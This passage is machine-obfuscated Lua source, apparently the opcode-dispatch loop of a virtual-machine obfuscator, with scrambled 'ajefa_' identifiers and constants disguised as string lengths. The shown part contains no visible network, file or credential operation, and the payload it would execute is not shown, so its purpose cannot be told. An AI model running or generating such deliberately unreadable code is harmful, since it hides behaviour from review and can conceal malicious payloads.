ajefa_IIIlIllIllllIIllIlllIIll<=#("drTSF7eEe11d3ZQrJYSHEbNYBBGHVo349W1fSBZMIOWr7iaSOb4s4UCbO5qdBISZ")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("6eh7KKh9f9Zov1sBY3TtLapt0CXjVka57tbe3UdCWsYUMWrd8NNP9Fv6YXhiW8")then local ajefa_IIIlIllIllllIIllIlllIIll;local ajefa_IllIllll;local ajefa_lIIIIIlIllIlllllllIIll;ajefa_lIIIIIlIllIlllllllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Xq")]ajefa_lIlllIll[ajefa_lIIIIIlIllIlllllllIIll]=ajefa_lIlllIll[ajefa_lIIIIIlIllIlllllllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_lIIIIIlIllIlllllllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("N9p")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("A1")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ZTl")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uu8t")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9u")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("f5F")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Y2")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("ISs")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IllIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("M6N")];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_IllIllll]for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IllIllll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("l6JJ")]do ajefa_IIIlIllIllllIIllIlllIIll=ajefa_IIIlIllIllllIIllIlllIIll..ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll];end;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fl")]]=ajefa_IIIlIllIllllIIllIlllIIll;ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("NC")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("K7p")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3nLy")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("guT")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("9m1y")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ck")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("vML")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vp")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("WbY")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IllIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("3aN")];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_IllIllll]for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IllIllll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("dI93")]do ajefa_IIIlIllIllllIIllIlllIIll=ajefa_IIIlIllIllllIIllIlllIIll..ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll];end;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sG")]]=ajefa_IIIlIllIllllIIllIlllIIll;elseif ajefa_IIIlIllIllllIIllIlllIIll>#("583rc0oHdZrIsmFRdjTliIv6C7fpfM4QYe3WSEpnUfKZS7dTtge9cXfyN70eU8B")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("l3")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3TI")]]+ajefa_lllIIlIllIlIllllIIlIIlll[#("qWHu")];else local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("2A")]ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll]=ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIIlIllIlIlllIlIlIllll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("uvD")]))end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("5MUntT8J4FCc7GoE3v59I5Nb8FiVOkDVOi4fnZALhFeHudAgSxlzdC298SpYKm5Uc")then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("zf5")];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("zZMiqd5u2d0fQ5fbdq9eSmp4hFKMa4KuFPPKFJghESKZi2ctSJjOV88lJSbVEtu7EG")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ae")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("1pI")]];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Mt")]]=(ajefa_lllIIlIllIlIllllIIlIIlll[#("UCe")]~=0);end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("aqFHEk1K9NAVoCp3CV5KHQDaXIuNkxNvNrbdmbQE3y8Jj6WsnA3lI5duXFU5ZoAMadi7BmRBfCRjS4")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("0WczUEBXRnRpSqUOP7vJfXZ2bTCggo4N3N3jXZQiJpBUT68jvXclvuWd6kybbuRDsevexK1Z")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("n9ZxeieUsVtmSqI10mNBOgoJ7BPK4WV6m4iv6R2bsrTKxqKXXnHxnzNhVpzODFZG9xaYi")then if ajefa_IIIlIllIllllIIllIlllIIll>#("4juLivxPmR01WRpzSYqaLRrnIYCmL9qWPLsxbNprUfdRXMSiqKPmHhMn1gcu3jemBeml")then if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("q0")]]==ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("S5bU")]])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("9xh")];end;else local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Vn")]ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll](ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll+1])end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("2xfI9pFNLB6ft6aueoH8eG4K5yLb1pSzHUymJOH2hLqQgoKnd1xZQmuxDFMMPDWuSIIKIX")then local ajefa_lIIIIIlIllIlllllllIIll=ajefa_lllIlllllIIlI[ajefa_lllIIlIllIlIllllIIlIIlll[#("tPY")]];local ajefa_IlIIIlIIIIlIIlllI;local ajefa_IIIlIllIllllIIllIlllIIll={};ajefa_IlIIIlIIIIlIIlllI=ajefa_lIIllIIIIIllIlIlllllII({},{__index=function(ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_lllIIlIllIlIllllIIlIIlll)local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll];return ajefa_lllIIlIllIlIllllIIlIIlll[1][ajefa_lllIIlIllIlIllllIIlIIlll[2]];end,__newindex=function(ajefa_lIlllIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_IlIIIlIllIlIlllIlIlIllll)local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll]ajefa_lllIIlIllIlIllllIIlIIlll[1][ajefa_lllIIlIllIlIllllIIlIIlll[2]]=ajefa_IlIIIlIllIlIlllIlIlIllll;end;});for ajefa_IlIIllIIIl=1,ajefa_lllIIlIllIlIllllIIlIIlll[#("3f8v")]do ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];if ajefa_lllIIlIllIlIllllIIlIIlll[#("c")]==82 then ajefa_IIIlIllIllllIIllIlllIIll[ajefa_IlIIllIIIl-1]={ajefa_lIlllIll,ajefa_lllIIlIllIlIllllIIlIIlll[#("4Vn")]};else ajefa_IIIlIllIllllIIllIlllIIll[ajefa_IlIIllIIIl-1]={ajefa_IllIllll,ajefa_lllIIlIllIlIllllIIlIIlll[#("sOz")]};end;ajefa_IIIlIlIlIlIllIIllIIIIlII[#ajefa_IIIlIlIlIlIllIIllIIIIlII+1]=ajefa_IIIlIllIllllIIllIlllIIll;end;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0u")]]=ajefa_lIIIllIlIIIIIllIlII(ajefa_lIIIIIlIllIlllllllIIll,ajefa_IlIIIlIIIIlIIlllI,ajefa_IlIIllIIIl);elseif ajefa_IIIlIllIllllIIllIlllIIll==#("ARO1DpoEQXx7a33StAbUeb5mOZ57JR9Pqf7hbv1hob6YrFVCZZokHcRyWCmOtq59XSR45VR")then local ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("o4")];local ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("eIJe")];local ajefa_lIIllIlIIlllII=ajefa_IlIIllIIIl+2 local ajefa_IlIIllIIIl={ajefa_lIlllIll[ajefa_IlIIllIIIl](ajefa_lIlllIll[ajefa_IlIIllIIIl+1],ajefa_lIlllIll[ajefa_lIIllIlIIlllII])};for ajefa_lllIIlIllIlIllllIIlIIlll=1,ajefa_IIIlIllIllllIIllIlllIIll do ajefa_lIlllIll[ajefa_lIIllIlIIlllII+ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll];end;local ajefa_IlIIllIIIl=ajefa_IlIIllIIIl[1]if ajefa_IlIIllIIIl then ajefa_lIlllIll[ajefa_lIIllIlIIlllII]=ajefa_IlIIllIIIl ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("zrC")];else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;end;else local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Gu")]local ajefa_IlIIllIIIl={ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIIlIllIlIlllIlIlIllll+1,ajefa_lIIIIIlIllIlllllllIIll))};local ajefa_lIIllIlIIlllII=0;for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_lllIIlIllIlIllllIIlIIlll[#{{605;418;586;960};{28;959;277;269};{264;81;718;170};{796;247;555;953};}]do ajefa_lIIllIlIIlllII=ajefa_lIIllIlIIlllII+1;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_IlIIllIIIl[ajefa_lIIllIlIIlllII];end end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("I4Gcfh5idEiTCZhoyKvKjnX7f6aKY0GdhqMMGOrOGdKZhlH8KDHvAgYugI7igvtm8fMlnGSTrRd")then if ajefa_IIIlIllIllllIIllIlllIIll<=#{"1 + 1 = 111";{325;69;98;626};{538;750;583;527};{443;650;776;532};"1 + 1 = 111";{577;124;607;955};{59;846;232;949};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{166;81;594;467};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{174;793;744;731};{676;754;474;911};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{643;370;145;46};"1 + 1 = 111";{609;743;656;61};{394;531;89;806};"1 + 1 = 111";"1 + 1 = 111";{189;141;798;603};{526;584;250;706};{360;631;956;726};{940;909;249;154};{895;550;434;401};{535;555;644;257};{796;964;475;59};{99;744;959;68};{843;381;683;144};"1 + 1 = 111";{942;908;956;269};{881;926;683;293};{385;712;695;533};{26;724;23;110};"1 + 1 = 111";{546;311;502;982};{217;796;438;520};{954;821;987;247};"1 + 1 = 111";"1 + 1 = 111";{397;836;957;129};{654;182;641;842};{889;524;945;274};{146;517;182;696};{855;650;58;123};"1 + 1 = 111";"1 + 1 = 111";{951;830;884;280};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{20;189;255;783};"1 + 1 = 111";{31;365;650;194};"1 + 1 = 111";{973;571;961;946};"1 + 1 = 111";"1 + 1 = 111";{258;719;319;942};{673;239;105;535};{260;970;122;121};{628;740;614;358};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{392;774;214;67};{689;313;842;238};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("1fz")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("qCkW")];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("ZVEbL9MZeaW6JkvDa3SPXBxyUGN9xNExRQdLVgnvBC0LUhxWygxv6VPyzgrevMDCHzp2hUR4Qx")then local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#("HQ")]ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll](ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll+1])else local ajefa_IIIlIllIllllIIllIlllIIll;local ajefa_IlIIllIIIl;ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("bN")];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QZ8")]];ajefa_lIlllIll[ajefa_IlIIllIIIl+1]=ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Xuek")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("En")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("DiX")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("CM")]ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_lIlllIll[ajefa_IlIIllIIIl](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIllIIIl+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("6i8")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Lb")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LeO")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("zAnZ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kl")]]==ajefa_lllIIlIllIlIllllIIlIIlll[#("7l1L")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("H5T")];end;end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("vLVOMj0MpphA6bQmPZi9Y9ydu2EPNACQKHtWNDP5F9mlA9s1CIbfIxzvnRsUPl9ZXC0zR3JljmFY")then local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("1tE")];local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIlllIll[ajefa_lIIllIlIIlllII]for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{{758;762;392;255};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]do ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll..ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll];end;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("HL")]]=ajefa_IlIIIlIllIlIlllIlIlIllll;elseif ajefa_IIIlIllIllllIIllIlllIIll==#("lOvJNnfyxhmi8J5j5psayz8i4kI805u2KKbd7kc84CBtNqTuOco7lYzXQmPDPhIBXuIzH2mUmug57")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0Rq")]];else local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("c6")]ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIIlIllIlIlllIlIlIllll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("asN")]))end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("GOBntXQyQWknxUGKsX39GrTuXV0FU0SD0bRbbCXUUAPWnsFCnNctb7in4gAJ7lNZdRyvdFJ19ipgN7gEqyqh")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("zB22Dg4boXJWZSG5jyTdkt3ScK796sJ4GbPpGDKzOZVvRtYoKJgaIdNfIk02i5f6nOqYcpzQXtAvIHbSW")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("zxlJxDyKSvNRpTUZiccamujBmnNrHbihgAGTUPrYADIddfeRLTz8PWGemUviZgcQmFLZnbeEVoKTWfy")then local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("2x")]local ajefa_IlIIllIIIl={ajefa_lIlllIll[ajefa_lIIllIlIIlllII](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_lIIllIlIIlllII+1,ajefa_lIIIIIlIllIlllllllIIll))};local ajefa_IlIIIlIllIlIlllIlIlIllll=0;for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII,ajefa_lllIIlIllIlIllllIIlIIlll[#("G95Z")]do ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_IlIIllIIIl[ajefa_IlIIIlIllIlIlllIlIlIllll];end elseif ajefa_IIIlIllIllllIIllIlllIIll>#("j6QXNkCu4BGasi8tA21IFoEKP5nBlXsgxo82Apdcdp5WGekMpqs4oZM5DgiS6bjghzNdkf4kZZFosReK")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=#ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("81X")]];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{847;948;771;529};{503;308;943;517};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Rrd")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("E4UQ")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("Lk4Ez2INdAsgufbgYOgBhCkxifAuxMWbI8u1oNTGfAgQLeETDhFc7iMjaIvtDmpCOqIxUk1l5KvRvEVdLQ")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kp")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7WP")]];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("ohUezvl1RrAd2kOctGg8rqsgyX5YGWrSWvau4mibJtk4GHDHRCBHFRJ8YNRMAyu49RqHjthhyfA8fzL0tzg")then if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sq")]]==ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("qUot")]])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("P2o")];end;else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{741;796;160;716};"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("NWn")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("IbYB")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#{"1 + 1 = 111";{529;713;125;180};"1 + 1 = 111";{511;454;853;239};{392;54;521;908};{273;575;492;784};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{51;363;737;315};"1 + 1 = 111";{973;49;632;910};{153;787;405;430};"1 + 1 = 111";{389;58;633;833};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{618;332;869;520};"1 + 1 = 111";{471;550;204;236};{608;348;499;299};"1 + 1 = 111";{799;45;547;998};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{375;318;204;935};"1 + 1 = 111";{587;95;928;29};{711;195;990;378};"1 + 1 = 111";{410;685;963;692};"1 + 1 = 111";"1 + 1 = 111";{765;261;563;744};{314;474;986;804};"1 + 1 = 111";{176;566;620;83};"1 + 1 = 111";"1 + 1 = 111";{885;877;302;614};{941;39;280;770};{99;761;145;140};{75;724;450;79};"1 + 1 = 111";{20;440;793;567};{109;765;723;27};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{82;267;800;912};"1 + 1 = 111";"1 + 1 = 111";{748;157;36;781};{41;540;21;798};{593;220;523;499};"1 + 1 = 111";"1 + 1 = 111";{29;744;37;66};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{896;705;885;5};"1 + 1 = 111";{572;144;798;455};{231;179;437;830};"1 + 1 = 111";{459;378;479;845};{860;22;519;79};"1 + 1 = 111";"1 + 1 = 111";{450;415;345;390};{947;961;887;540};}then if ajefa_IIIlIllIllllIIllIlllIIll<=#("JIOPzK9PM5N3tsg0AHlXhors3TKcn8AsLvhjaRPLp62XObTr8d0TTlBtpvVQa6BNFus8l7ZT1LIkxEO19rejh")then local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("oO")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("vUz")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("65")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("uVQ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Vq")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1uB")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("PtTQ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("K6")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("FeI")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{156;919;227;903};{888;349;674;654};"1 + 1 = 111";{345;419;64;743};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("O8")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ri8")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("d7VM")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9M")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("27Q")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("XAo4")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Qf")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 